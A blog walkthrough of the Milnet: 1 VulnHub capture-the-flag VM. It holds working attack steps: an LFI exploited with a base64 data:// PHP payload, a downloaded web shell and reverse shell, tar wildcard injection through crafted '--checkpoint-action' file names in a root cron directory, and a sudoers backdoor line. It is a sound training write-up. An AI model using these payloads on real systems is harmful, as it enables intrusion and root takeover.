---
layout: post
cover: True
cover: '/assets/images/milnet/end.jpg'
title: "Milnet: 1 - Walkthrough"
date:   2016-06-02 10:18:00
tags: CTF Hacking ITsecurity
categories: 'CTF'
navigation: True
---
<p>Hi everyone, finally I decided to write some of articls that releated to IT security, so I started with Milnet VM. First, starting with scanning the network to identify the VM's ip address </p>

<h3 id="bigimage">scanning the network</h3>
<img src="/assets/images/milnet/arp-scan.jpg" alt="arp-scan tool" />
<p>Since it's a local network, the fastest way to scan the network is using the arp technique. Therefore, as shown it's the only machine on this network :D. Next, nmap's time to check what services this machine provides.</p>

{% highlight bash %}
💥  ⑂aSr 🎃  >> sudo nmap -sS -n -v -f -T4 -sV 192.168.64.22 -p-
Warning: Packet fragmentation selected on a host other than Linux, OpenBSD, FreeBSD, or NetBSD.  This may or may not work.

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-02 23:22 PDT
NSE: Loaded 36 scripts for scanning.
Initiating ARP Ping Scan at 23:22
Scanning 192.168.64.22 [1 port]
Completed ARP Ping Scan at 23:22, 0.01s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:22
Scanning 192.168.64.22 [65535 ports]
Discovered open port 22/tcp on 192.168.64.22
Discovered open port 80/tcp on 192.168.64.22
Completed SYN Stealth Scan at 23:22, 19.77s elapsed (65535 total ports)
Initiating Service scan at 23:22
Scanning 2 services on 192.168.64.22
Completed Service scan at 23:22, 6.10s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.64.22.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.39s elapsed
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
Nmap scan report for 192.168.64.22
Host is up (0.0040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.35
MAC Address: 1A:4A:94:42:CF:32 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
Raw packets sent: 65539 (2.884MB) | Rcvd: 65536 (2.621MB)
{% endhighlight %}


<h3 id="bigimage">Brute Force Result!</h3>
<p>It looks that we are going to need some of the web application skills :D. The web site is really simple and no much information has.</p><p>brute force directories is my favorate. Many tools could do this task, such as wfuzz, dirb, and dirbuster, for this one, I have used dirb on Kali linux, and I have the following:</p>
<p><div data-height="268" data-theme-id="0" data-slug-hash="bcqhe" data-default-tab="js" data-user="rglazebrook" class='codepen'>
<pre><code>main.php
content.php
nav.php
bomb.php
info.php
props.php
</code></pre></div></p>

<p>info.php shows much information about the php and its environment and the useful information that I could get is the following:</p>
<pre><code>allow_url_fopen		On
allow_url_include	On
$_SERVER['DOCUMENT_ROOT']	/var/www/html
$_SERVER['SCRIPT_FILENAME']	/var/www/html/info.php</code></pre>

<h3 id="bigimage">LFI</h3>
<pre><code>💥  ⑂aS3r 🎃  >> curl -x 127.0.0.1:8080 http://192.168.64.22</code></pre>	
<p>during the examination, I have noticed that the index page sends a post request to content.php with route parameter <code>route=main</code>! Since I know there is a info.php file on the same directory, I have tried to put <code>route=info</code>!!! Surprisingly, I have the same page as the info.php. Therefore, here we have <code>include</code> function with <code>.php</code> at the end!</p>

<p>To confirm that is a LFI vulnerabilty. I have tried the following since I know the full path of the web server</p>
<code>route=../../../var/www/html/info</code>
<p>And bingo! we have LFI without any filter, but we still require to get off the <code>.php</code>!!! For this one, I have spend some time trying some of bypass LFI techinques, and the only one that works with me is:</p>

<code>route=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==</code>
<p>Using LFI, I was able to perform remote command injection using the base64 form of the following php code:</p>
{% highlight php %}<?php system('ls'); ?>{% endhighlight %}

<h3 id="bigimage">Reverse Shell</h3>
<p>Therefore, I was able to <code>wget</code> my shell. The following picture shows that I have successfully downloaded the cmd.php file:</p>
<img src="/assets/images/milnet/upload.jpg" />

<p>And here accessing the cmd.php</p>
<img src="/assets/images/milnet/shell.jpg">
<p>I have successfully received a reverse shell on port 5555 using b374k shell features.</p>
<img src="/assets/images/milnet/rev.jpg">

<h3 id="bigimage">Tar command execution!</h3>
<p>During the anlysis of the server, I have noticed that <code>/etc/crontab</code> is readable! It looks that <code>backup.sh</code> does a backup of the web directory every one minute:</p>

{% highlight bash %}
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 * 	* * * 	root	/backup/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
{% endhighlight %}

<p>Checking <code>/backup/backup.sh</code> file, and It has a root privillege!!! this is good. Checking the content!</p>
<pre><code>#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *</code></pre>

<p>During the examination of server, I have found many txt files at <code>/home/langman/SDINET</code> and one of them gets my attention which is <code>DefenseCode_Unix_WildCards_Gone_Wild.txt</code>. It has a section about how to get a command execution using tar command!!!! Bingooo :))</p>
<p>Since <code>backup.sh</code> has root privilleges, we can take advantage of getting remote execution.</p>
<p>We require to create 3 files on the same directory that tar creates a backup from, which is in this case is <code>/var/www/html/</code>as the following:</p>
<pre><code>1. "--checkpoint=1"
2. "--checkpoint-action=exec=sh shell.sh"
3. shell.sh - that has commands!</code></pre>

{% highlight bash %}
www-data@seckenheim:/var/www/html$ ls -la
total 228
drwxr-xr-x 2 www-data www-data  4096 Jun  3 08:12 .
drwxr-xr-x 3 root     root      4096 May 21 15:50 ..
-rw-r--r-- 1 root     root     73450 Aug  6  2015 bomb.jpg
-rw-r--r-- 1 root     root      3901 May 21 18:56 bomb.php
-rw-r--r-- 1 www-data www-data 99552 Mar 19  2014 cmd.php
-rw-r--r-- 1 root     root       124 May 21 17:50 content.php
-rw-r--r-- 1 root     root       145 May 21 17:17 index.php
-rw-r--r-- 1 www-data www-data    20 May 21 15:54 info.php
-rw-r--r-- 1 root     root       109 May 21 18:53 main.php
-rw-r--r-- 1 root     root     18260 Jan 22  2012 mj.jpg
-rw-r--r-- 1 root     root       532 May 21 23:33 nav.php
-rw-r--r-- 1 root     root       253 May 22 21:07 props.php
www-data@seckenheim:/var/www/html$ echo "" > shell.sh; chmod +x shell.sh
www-data@seckenheim:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@seckenheim:/var/www/html$ echo "" > --checkpoint=1
www-data@seckenheim:/var/www/html$
{% endhighlight %}

<h3 id="bigimage">Getting root Privilleges!</h3>
<p>Everything is set, now we need to put commands that help us to execute with root privilleges!, but first I want to check if everything is correct, so I have inserted the following <code>id > /tmp/id.txt</code> into shell.sh!, and after one minute!!!!!!</p>

{% highlight bash %}
ww-data@seckenheim:/var/www/html$ echo "id > /tmp/id.txt" >> shell.sh
www-data@seckenheim:/var/www/html$ cat shell.sh

id > /tmp/id.txt
www-data@seckenheim:/var/www/html$ ls -l /tmp
total 4
drwx------ 3 root root 4096 Jun  3 08:26 systemd-private-7060a45ca3a74b00b3de2e03b690a5a5-systemd-timesyncd.service-qdQWyT
www-data@seckenheim:/var/www/html$ ls -la /tmp
total 36
drwxrwxrwt  8 root root 4096 Jun  3 09:05 .
drwxr-xr-x 24 root root 4096 May 21 20:14 ..
drwxrwxrwt  2 root root 4096 Jun  3 08:26 .ICE-unix
drwxrwxrwt  2 root root 4096 Jun  3 08:26 .Test-unix
drwxrwxrwt  2 root root 4096 Jun  3 08:26 .X11-unix
drwxrwxrwt  2 root root 4096 Jun  3 08:26 .XIM-unix
drwxrwxrwt  2 root root 4096 Jun  3 08:26 .font-unix
-rw-r--r--  1 root root   39 Jun  3 09:05 id.txt
drwx------  3 root root 4096 Jun  3 08:26 systemd-private-7060a45ca3a74b00b3de2e03b690a5a5-systemd-timesyncd.service-qdQWyT
www-data@seckenheim:/var/www/html$ cat /tmp/id.txt
uid=0(root) gid=0(root) groups=0(root)
www-data@seckenheim:/var/www/html$
{% endhighlight %}

<p>Finally, I have added a www-data user to <code>/etc/sudoers</code>to get access to the root user! I am sure others will have different way to do this!
{% highlight bash %}echo "www-data  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers{% endhighlight %}
<p>into shell.sh file. And after one minute!!</p>
{% highlight bash %}
www-data@seckenheim:/var/www/html$ sudo su
sudo su
root@seckenheim:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@seckenheim:/var/www/html# ls -l /root
total 4
-rw-r--r-- 1 root root 1727 May 21 22:42 credits.txt
root@seckenheim:/var/www/html#
{% endhighlight %}
<img src="/assets/images/milnet/end.jpg">

<p>Finally, I would like to thank <code>@teh_warriar</code> and <code>#vulnhub</code> for the VM. It was fun.</p>







